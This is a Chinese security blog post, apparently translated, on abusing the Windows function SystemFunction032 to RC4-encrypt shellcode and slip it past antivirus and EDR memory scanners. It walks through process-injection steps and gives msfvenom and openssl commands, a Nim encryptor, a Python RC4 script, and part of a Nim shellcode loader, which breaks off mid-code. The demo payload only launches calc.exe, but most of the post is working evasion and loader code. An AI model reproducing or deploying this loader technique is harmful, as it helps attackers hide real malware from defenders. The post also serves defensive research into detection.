---
title: SystemFunction032函数的免杀研究
url: https://www.secpulse.com/archives/192216.html
source: 安全脉搏
date: 2022-11-26
fetch_date: 2025-10-03T23:48:26.627734
---

# SystemFunction032函数的免杀研究

[![](https://www.secpulse.com/wp-content/themes/secpulse2017/img/logo-header.png)](https://www.secpulse.com "安全脉搏")

* [首页](https://www.secpulse.com/)
* [分类阅读](https://www.secpulse.com/archives/category/category)

  #### 脉搏文库

  - [内网渗透](https://www.secpulse.com/archives/category/articles/intranet-penetration)
  - |
  - [代码审计](https://www.secpulse.com/archives/category/articles/code-audit)
  - |
  - [安全文献](https://www.secpulse.com/archives/category/articles/sec-doc)
  - |
  - [Web安全](https://www.secpulse.com/archives/category/articles/web)
  - |
  - [移动安全](https://www.secpulse.com/archives/category/articles/mobile-security)
  - |
  - [系统安全](https://www.secpulse.com/archives/category/articles/system)
  - |
  - [工控安全](https://www.secpulse.com/archives/category/articles/industrial-safety)
  - |
  - [CTF](https://www.secpulse.com/archives/category/exclusive/ctf-writeup)
  - |
  - [IOT安全](https://www.secpulse.com/archives/category/iot-security)
  - |

#### 安全建设

+ [业务安全](https://www.secpulse.com/archives/category/construction/businesssecurity)
+ |
+ [安全管理](https://www.secpulse.com/archives/category/construction/securityissue)
+ |
+ [数据分析](https://www.secpulse.com/archives/category/construction/bigdata)
+ |

#### 其他

+ [资讯](https://www.secpulse.com/archives/category/news)
+ |
+ [漏洞](https://www.secpulse.com/archives/category/vul)
+ |
+ [工具](https://www.secpulse.com/archives/category/tools)
+ |
+ [人物志](https://www.secpulse.com/archives/category/people)
+ |
+ [区块链安全](https://www.secpulse.com/archives/category/exclusive/block_chain_security)
+ |
+ [安全招聘](https://www.secpulse.com/archives/category/hiring)
+ |

- [安全问答](https://www.secpulse.com/newpage/question_list)
- [金币商城](https://www.secpulse.com/shop?donotcachepage=c010349fd98847cb9d6e07d3cbc19288)
- [安全招聘](https://www.secpulse.com/archives/category/hiring)
- [活动日程](https://www.secpulse.com/newpage/activity)
- [live课程](https://www.secpulse.com/live)
- [企业服务](https://duoyinsu.com/service.html)
- [插件社区](https://x.secpulse.com/)

小程序

![脉搏小程序](https://www.secpulse.com/wp-content/themes/secpulse2017/img/wxchat.jpg)
[登录](https://www.secpulse.com/user_login)
|
[注册](https://www.secpulse.com/user-register)

# SystemFunction032函数的免杀研究

[Web安全](https://www.secpulse.com/archives/category/articles/web)

[蚁景网安实验室](https://www.secpulse.com/newpage/author?author_id=37244)
![]( https://www.secpulse.com/wp-content/themes/secpulse2017/img/renzheng2.png)

2022-11-25

15,194

声明：本文仅限于技术讨论与分享，严禁用于非法途径。若读者因此作出任何危害网络安全行为后果自负，与本号及原作者无关。

### 什么是SystemFunction032函数？

虽然Benjamin Delphi在2013年就已经在Mimikatz中使用了它，但由于我之前对它的研究并不多，才有了下文。

这个函数能够通过RC4加密方式对内存区域进行加密/解密。例如，ReactOS项目的代码中显示，它需要一个指向RC4\_Context结构的指针作为输入，以及一个指向加密密钥的指针。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-192216-1669340433.png "null")

不过，目前来看，除了XOR操作，至少我个人还不知道其他的针对内存区域加密/解密的替代函数。但是，你可能在其他研究员的博客中也读到过关于规避内存扫描器的文章，使用简单的XOR操作，攻击者即使是使用了较长的密钥，也会被AV/EDR供应商检测到。

### 初步想法

虽然RC4算法被认为是不安全的，甚至多年来已经被各个安全厂商研究，但是它为我们提供了一个更好的内存规避的方式。如果我们直接使用AES，可能会更节省OpSec。但是一个简单的单一的Windows API是非常易于使用的。

通常情况下，如果你想在一个进程中执行Shellcode，你需要执行以下步骤。

1、打开一个到进程的句柄

2、在该进程中分配具有RW/RX或RWX权限的内存

3、将Shellcode写入该区域

4、(可选)将权限从RW改为RX，以便执行

5、以线程/APC/回调/其他方式执行Shellcode。

为了避免基于签名的检测，我们可以在执行前对我们的Shellcode进行加密并在运行时解密。

例如，对于AES解密，流程通常是这样的。

1、打开一个到进程的句柄

2、用RW/RX或RWX的权限在该进程中分配内存

3、解密Shellcode，这样我们就可以将shellcode的明文写入内存中

4、将Shellcode写入分配的区域中

5、(可选)把执行的权限从RW改为RX

6、以线程/APC/回调/其他方式执行Shellcode

在这种情况下，Shellcode本身在写入内存时可能会被发现，例如被用户区的钩子程序发现，因为我们需要把指向明文Shellcode的指针传递给WriteProcessMemory或NtWriteVirtualMemory。

XOR的使用可以很好的避免这一点，因为我们还可以在将加密的值写入内存后XOR解密内存区域。简单来讲就像这样。

1、为进程打开一个句柄

2、在该进程中以RW/RX或RWX的权限分配内存

3、将Shellcode写入分配的区域中

4、XOR解密Shellcode的内存区域

5、(可选)把执行的权限从RW改为RX

6、以线程/APC/回调/其他方式执行Shellcode。

但是XOR操作很容易被发现。所以我们尽可能不去使用这种方式。

这里有一个很好的替代方案，我们可以利用SystemFunction032来解密Shellcode，然后将其写入内存中。

### 生成POC

首先，我们需要生成Shellcode，然后使用OpenSSL对它进行RC4加密。因此，我们可以使用msfvenom来生成。

```
msfvenom -p windows/x64/exec CMD=calc.exe -f raw -o calc.bin
cat calc.bin | openssl enc -rc4 -nosalt -k "aaaaaaaaaaaaaaaa" > enccalc.bin
```

但后来在调试时发现，SystemFunction032的加密/解密方式与OpenSSL/RC4不同。所以我们不能这样做。

最终修改为

```
openssl enc -rc4 -in calc.bin -K `echo -n 'aaaaaaaaaaaaaaaa' | xxd -p` -nosalt > enccalc.bin
```

我们也可以使用下面的Nim代码来获得一个加密的Shellcode blob（仅Windows操作系统）。

```
import winim
import winim/lean

# msfvenom -p windows/x64/exec CMD=calc.exe -f raw -o calc.bin
const encstring = slurp"calc.bin"

func toByteSeq*(str: string): seq[byte] {.inline.} =
  ## Converts a string to the corresponding byte sequence.
  @(str.toOpenArrayByte(0, str.high))

proc SystemFunction032*(memoryRegion: pointer, keyPointer: pointer): NTSTATUS
  {.discardable, stdcall, dynlib: "Advapi32", importc: "SystemFunction032".}

# This is the mentioned RC4 struct
type
    USTRING* = object
        Length*: DWORD
        MaximumLength*: DWORD
        Buffer*: PVOID

var keyString: USTRING
var imgString: USTRING

# Our encryption Key
var keyBuf: array[16, char] = [char 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a']

keyString.Buffer = cast[PVOID](&keyBuf)
keyString.Length = 16
keyString.MaximumLength = 16

var shellcode = toByteSeq(encstring)
var size  = len(shellcode)

# We need to still get the Shellcode to memory to encrypt it with SystemFunction032
let tProcess = GetCurrentProcessId()
echo "Current Process ID: ", tProcess
var pHandle: HANDLE = OpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess)
echo "Process Handle: ", repr(pHandle)
let rPtr = VirtualAllocEx(
    pHandle,
    NULL,
    cast[SIZE_T](size),
    MEM_COMMIT,
    PAGE_READ_WRITE
)

copyMem(rPtr, addr shellcode[0], size)

# Fill the RC4 struct
imgString.Buffer = rPtr
imgString.Length = cast[DWORD](size)
imgString.MaximumLength = cast[DWORD](size)

# Call SystemFunction032
SystemFunction032(&imgString, &keyString)

copyMem(addr shellcode[0],rPtr ,size)

echo "Writing encrypted shellcode to dec.bin"

writeFile("enc.bin", shellcode)
# enc.bin contains our encrypted Shellcode
```

之后，又写出了一个简单的Python脚本，用Python脚本简化了加密的过程。

```
#!/usr/bin/env python3

from typing import Iterator
from base64 import b64encode

# Stolen from: https://gist.github.com/hsauers5/491f9dde975f1eaa97103427eda50071
def key_scheduling(key: bytes) -> list:
   sched = [i for i in range(0, 256)]

   i = 0
   for j in range(0, 256):
       i = (i + sched[j] + key[j % len(key)]) % 256
       tmp = sched[j]
       sched[j] = sched[i]
       sched[i] = tmp

   return sched

def stream_generation(sched: list[int]) -> Iterator[bytes]:
   i, j = 0, 0
   while True:
       i = (1 + i) % 256
       j = (sched[i] + j) % 256
       tmp = sched[j]
       sched[j] = sched[i]
       sched[i] = tmp
       yield sched[(sched[i] + sched[j]) % 256]

def encrypt(plaintext: bytes, key: bytes) -> bytes:
   sched = key_scheduling(key)
   key_stream = stream_generation(sched)

   ciphertext = b''
   for char in plaintext:
       enc = char ^ next(key_stream)
       ciphertext += bytes([enc])

   return ciphertext

if __name__ == '__main__':
   # msfvenom -p windows/x64/exec CMD=calc.exe -f raw -o calc.bin
   with open('calc.bin', 'rb') as f:
       result = encrypt(plaintext=f.read(), key=b'aaaaaaaaaaaaaaaa')

   print(b64encode(result).decode())
```

为了执行这个shellcode，我们可以简单地使用以下Nim代码。

```
import winim
import winim/lean

# (OPTIONAL) do some Environmental Keying stuff

# Encrypted with the previous code
# Embed the encrypted Shellcode on compile time as string
const encstring = slurp"enc.bin"

func toByteSeq*(str: string): seq[byte] {.inline.} =
  ## Converts a string to the corresponding byte sequence.
  @(str.toOpenArrayByte(0, str.high))

proc SystemFunction032*(memoryRegion: pointer, keyPointer: pointer): NTSTATUS
  {.discardable, stdcall, dynlib: "Advapi32", importc: "SystemFunction032".}

type
    USTRING* = object
        Length*: DWORD
        MaximumLength*: DWORD
        Buffer*: PVOID

var keyString: USTRING
var imgString: USTRING

# Same Key
var keyBuf: array[16, char] = [char 'a', 'a', 'a', 'a', 'a', 'a...